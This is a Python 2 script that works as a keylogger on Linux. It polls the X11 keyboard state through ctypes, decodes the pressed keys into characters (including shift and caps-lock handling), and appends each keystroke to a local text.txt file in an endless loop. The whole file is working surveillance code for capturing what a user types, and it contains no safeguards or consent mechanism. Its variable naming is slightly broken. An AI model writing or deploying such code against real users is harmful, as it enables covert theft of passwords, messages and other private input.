__author__ = 'valentin'

import ctypes as ct
from ctypes.util import find_library
import os
import sys

assert("linux" in sys.platform)

x11 = ct.cdll.LoadLibrary(find_library("X11"))
display = x11.XOpenDisplay(None)

keyboard = (ct.c_char * 32)()

shift_keys = ((6,4), (7,64))
modifiers = {
    "left shift": (6,4),
    "right shift": (7,64),
    "left ctrl": (4,32),
    "right ctrl": (13,2),
    "left alt": (8,1),
    "right alt": (13,16),
    "caps lock": (8,4)
}

last_pressed = set()
last_pressed_adjusted = set()
last_modifier_state = {}
caps_lock_state = 0

key_mapping = {
    1: {
        0b00000010: ("<esc>","<esc>"),
        0b00000100: ("1", "!"),
        0b00001000: ("2", "@"),
        0b00010000: ("3", "#"),
        0b00100000: ("4", "$"),
        0b01000000: ("5", "%"),
        0b10000000: ("6", "^"),
    },
    2: {
        0b00000001: ("7", "&"),
        0b00000010: ("8", "*"),
        0b00000100: ("9", "("),
        0b00001000: ("0", ")"),
        0b00010000: ("-", "_"),
        0b00100000: ("=", "+"),
        0b01000000: ("<backspace>","<backspace>"),
        0b10000000: ("<tab>","<tab>"),
    },
    3: {
        0b00000001: ("q", "Q"),
        0b00000010: ("w", "W"),
        0b00000100: ("e", "E"),
        0b00001000: ("r", "R"),
        0b00010000: ("t", "T"),
        0b00100000: ("y", "Y"),
        0b01000000: ("u", "U"),
        0b10000000: ("i", "I"),
    },
    4: {
        0b00000001: ("o", "O"),
        0b00000010: ("p", "P"),
        0b00000100: ("[", "{"),
        0b00001000: ("]", "}"),
        0b00010000: ("\n","\n"),
        #0b00100000: "<left ctrl>",
        0b01000000: ("a", "A"),
        0b10000000: ("s", "S"),
    },
    5: {
        0b00000001: ("d", "D"),
        0b00000010: ("f", "F"),
        0b00000100: ("g", "G"),
        0b00001000: ("h", "H"),
        0b00010000: ("j", "J"),
        0b00100000: ("k", "K"),
        0b01000000: ("l", "L"),
        0b10000000: (";", ":"),
    },
    6: {
        0b00000001: ("'", "\""),
        0b00000010: ("`", "~"),
        #0b00000100: "<left shift>",
        0b00001000: ("\\", "|"),
        0b00010000: ("z", "Z"),
        0b00100000: ("x", "X"),
        0b01000000: ("c", "C"),
        0b10000000: ("v", "V"),
    },
    7: {
        0b00000001: ("b", "B"),
        0b00000010: ("n", "N"),
        0b00000100: ("m", "M"),
        0b00001000: (",", "<"),
        0b00010000: (".", ">"),
        0b00100000: ("/", "?"),
        #0b01000000: "<right shift>",
    },
    8: {
        #0b00000001: "<left alt>",
        0b00000010: (" "," "),
        # 0b00000100: ("caps_lock","caps_lock"),
    },
    13: {
        #0b00000010: "<right ctrl>",
        #0b00010000: "<right alt>",
    },
}

def fetch_keys_raw():
    x11.XQueryKeymap(display, keyboard)
    return keyboard

def fetch_keys():
    global caps_lock_state, last_pressed, last_pressed_adjusted, last_modifier_state
    keypresses_raw = fetch_keys_raw()

    # check modifier states (ctrl, alt, shift keys)
    modifier_state = {}
    for mod, (i,byte) in modifiers.iteritems():
        modifier_state[mod] = bool(ord(keypresses_raw[i])& byte)

    # shift pressed?
    shift = 0
    for i, byte in shift_keys:
        if ord(keypresses_raw[i]) & byte:
            shift = 1
            break

    # caps lock state
    if ord(keypresses_raw[8]) & 4:
        caps_lock_state = int(not caps_lock_state)

    pressed = []
    for i, k in enumerate(keypresses_raw):
        num_key = ord(k)
        if num_key:
            for byte,key in key_mapping.get(i, {}).iteritems():
                if byte & num_key:
                    if isinstance(key, tuple):
                        p_key = key[shift or caps_lock_state]
                    pressed.append(p_key)

    tmp = pressed
    pressed = list(set(pressed).difference(last_pressed))
    state_changed = tmp != last_pressed and (pressed or last_pressed_adjusted)
    last_pressed =tmp
    last_pressed_adjusted = pressed

    if pressed:
        pressed = pressed[0]
    else:
        pressed = None

    state_changed = last_modifier_state and (state_changed or modifier_state != last_modifier_state)
    last_modifier_state = modifier_state

    return state_changed, pressed

def write_file(kyes):
    st = os.getcwd()
    st +="/text.txt"
    print st

    f = open(st,"a")

    try:
        f.write(keys)
    except:
        print keys

    f.close()

while 1:
     changed, keys =  fetch_keys()
     if changed:
         write_file(keys)

